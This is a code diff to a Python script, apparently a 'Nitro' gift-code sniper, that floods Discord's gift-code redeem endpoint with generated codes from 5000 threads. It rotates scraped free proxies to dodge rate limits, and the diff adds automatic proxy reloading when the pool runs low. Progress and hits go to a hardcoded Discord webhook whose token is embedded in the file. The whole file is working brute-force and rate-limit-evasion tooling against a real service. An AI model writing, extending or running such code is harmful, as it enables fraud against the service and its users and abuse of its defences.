@@ -13,7 +13,9 @@ import sys
 WEBHOOK_URL = "https://discordapp.com/api/webhooks/1485352726174109697/yy-qCCh6x3ch8FQqlcCZVRjjJ4Wh1unHjqmeKRREp6bLBSuLEjexdvLz7Jm34ORRaDUW"
 VALID_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1485387737845600341/ahnxMXxyl9MkSXLZEOBQaoQY82V50dtzKOwb7zJrI6G4JpsfzxXQUfUvSOJfOT2lAjCz"
 USER_ID = "761255648242696206"
-DEBUG_INTERVAL = 5  # seconds — change to 300 for 5 minutes
+DEBUG_INTERVAL = 5        # seconds — change to 300 for 5 minutes
+DEAD_THRESHOLD = 25       # fails before a proxy is marked dead
+RELOAD_THRESHOLD = 1000   # reload fresh proxies when alive proxies drop below this
 
 class NitroScanner:
     def __init__(self):
@@ -27,6 +29,8 @@ class NitroScanner:
         self.dead_proxies = set()
         self.lock = threading.Lock()
         self.start_time = 0
+        self.proxy_queue = None
+        self.reloading = False
         
         self.user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -81,12 +85,13 @@ class NitroScanner:
             print(f"[-] Error loading proxies: {e}")
             return False
     
-    def load_proxies_online(self):
+    def fetch_proxies_online(self):
         proxy_sources = {
             'http': [
                 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
                 'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
                 'https://raw.githubusercontent.com/proxygenerator1/ProxyGenerator/refs/heads/main/ALL/ALL.txt',
+                'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt',
                 'https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&format=text',
             ],
             'socks4': [
@@ -101,11 +106,8 @@ class NitroScanner:
             ]
         }
         
-        print("[*] Loading proxies from online sources...")
         all_proxies = set()
-        
         for proxy_type, sources in proxy_sources.items():
-            print(f"[*] Loading {proxy_type.upper()} proxies...")
             for source in sources:
                 try:
                     response = requests.get(source, timeout=10)
@@ -117,15 +119,39 @@ class NitroScanner:
                                 if not proxy.startswith(f'{proxy_type}://'):
                                     proxy = f'{proxy_type}://{proxy}'
                                 all_proxies.add(proxy)
-                        print(f"[+] Loaded {len(proxies)} {proxy_type.upper()} proxies from {source.split('/')[2]}")
-                except Exception as e:
-                    print(f"[-] Failed to load {proxy_type.upper()} from {source}: {e}")
-        
-        self.proxies = list(all_proxies)
+                except Exception:
+                    continue
+        return list(all_proxies)
+
+    def load_proxies_online(self):
+        print("[*] Loading proxies from online sources...")
+        self.proxies = self.fetch_proxies_online()
         print(f"[+] Total proxies loaded: {len(self.proxies)}")
         self.print_proxy_stats()
         return self.proxies
-    
+
+    def reload_proxies(self):
+        if self.reloading:
+            return
+        self.reloading = True
+        print("\n[*] Reloading proxies from online sources...")
+        requests.post(WEBHOOK_URL, json={"content": "🔄 **Proxy pool running low — reloading fresh proxies...**"})
+        try:
+            new_proxies = self.fetch_proxies_online()
+            with self.lock:
+                # Reset dead proxies and fail counts
+                self.dead_proxies = set()
+                self.proxy_fail_count = {}
+                self.proxies = new_proxies
+                # Refill the proxy queue
+                for proxy in new_proxies:
+                    self.proxy_queue.put(proxy)
+            print(f"[+] Reloaded {len(new_proxies)} proxies")
+            requests.post(WEBHOOK_URL, json={"content": f"✅ **Proxy pool reloaded with {len(new_proxies):,} fresh proxies**"})
+        except Exception as e:
+            print(f"[-] Failed to reload proxies: {e}")
+        self.reloading = False
+
     def print_proxy_stats(self):
         http_count = sum(1 for p in self.proxies if p.startswith('http://') or p.startswith('https://'))
         socks4_count = sum(1 for p in self.proxies if p.startswith('socks4://'))
@@ -142,12 +168,11 @@ class NitroScanner:
     def mark_proxy_failed(self, proxy):
         with self.lock:
             self.proxy_fail_count[proxy] = self.proxy_fail_count.get(proxy, 0) + 1
-            if self.proxy_fail_count[proxy] >= 10:
+            if self.proxy_fail_count[proxy] >= DEAD_THRESHOLD:
                 self.dead_proxies.add(proxy)
 
     def check_code(self, code, proxy):
         url = f"https://discord.com/api/v9/entitlements/gift-codes/{code}/redeem"
-        
         headers = {
             'User-Agent': random.choice(self.user_agents),
             'Accept': '*/*',
@@ -156,12 +181,7 @@ class NitroScanner:
             'Origin': 'https://discord.com',
             'Referer': 'https://discord.com/'
         }
-        
-        proxy_dict = {
-            'http': proxy,
-            'https': proxy
-        }
-        
+        proxy_dict = {'http': proxy, 'https': proxy}
         try:
             response = requests.post(url, headers=headers, proxies=proxy_dict, timeout=1)
             if response.status_code == 200:
@@ -205,14 +225,20 @@ class NitroScanner:
                     f"⏱️ Uptime: {elapsed/60:.1f} minutes"
                 )
                 requests.post(WEBHOOK_URL, json={"content": msg})
+
+                # Auto-reload if proxies running low
+                if alive_proxies < RELOAD_THRESHOLD and not self.reloading:
+                    reload_thread = threading.Thread(target=self.reload_proxies, daemon=True)
+                    reload_thread.start()
+
             except Exception:
                 continue
 
-    def scan_worker(self, code_queue, proxy_queue):
+    def scan_worker(self, code_queue):
         while self.running:
             try:
                 code = code_queue.get(timeout=1)
-                proxy = proxy_queue.get(timeout=1)
+                proxy = self.proxy_queue.get(timeout=1)
 
                 if proxy in self.dead_proxies:
                     code_queue.task_done()
@@ -258,14 +284,13 @@ class NitroScanner:
                                  f"CHECKED: {self.total_checked:,} | "
                                  f"VALID: {len(self.valid_codes)} | "
                                  f"RATE LIMITED: {self.rate_limited:,} | "
-                                 f"DEAD PROXIES: {len(self.dead_proxies):,} | "
-                                 f"SPEED: {speed:.0f}/s | "
-                                 f"QUEUE: {code_queue.qsize():,}")
+                                 f"DEAD: {len(self.dead_proxies):,} | "
+                                 f"SPEED: {speed:.0f}/s")
                         sys.stdout.write(status)
                         sys.stdout.flush()
 
                 if proxy not in self.dead_proxies:
-                    proxy_queue.put(proxy)
+                    self.proxy_queue.put(proxy)
                 code_queue.task_done()
                 
             except Exception:
@@ -305,11 +330,11 @@ class NitroScanner:
             print("[!] Your IP may get rate limited")
         
         code_queue = Queue(maxsize=100000)
-        proxy_queue = Queue()
+        self.proxy_queue = Queue()
         
         if use_proxies:
             for proxy in self.proxies:
-                proxy_queue.put(proxy)
+                self.proxy_queue.put(proxy)
         
         NUM_THREADS = 5000
         CODES_PER_SECOND = 8000
@@ -319,13 +344,13 @@ class NitroScanner:
         print(f"Generation rate: {CODES_PER_SECOND:,} codes/sec")
         print(f"Proxy rotation: {'Enabled' if use_proxies else 'Disabled'}")
         print(f"Proxy types: HTTP, SOCKS4, SOCKS5")
+        print(f"Auto-reload threshold: {RELOAD_THRESHOLD:,} alive proxies")
         print(f"\n[OUTPUT]")
         print(f"Valid codes will appear here instantly")
         print(f"All found codes saved to: SNIPED_CODES.txt")
         print(f"\n[STATUS]")
         print("Press Ctrl+C to stop\n")
         
-        # Start debug background thread
         debug_thread = threading.Thread(target=self.debug_worker, daemon=True)
         debug_thread.start()
 
@@ -335,7 +360,7 @@ class NitroScanner:
         with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
             futures = []
             for _ in range(NUM_THREADS):
-                future = executor.submit(self.scan_worker, code_queue, proxy_queue)
+                future = executor.submit(self.scan_worker, code_queue)
                 futures.append(future)
             
             try:
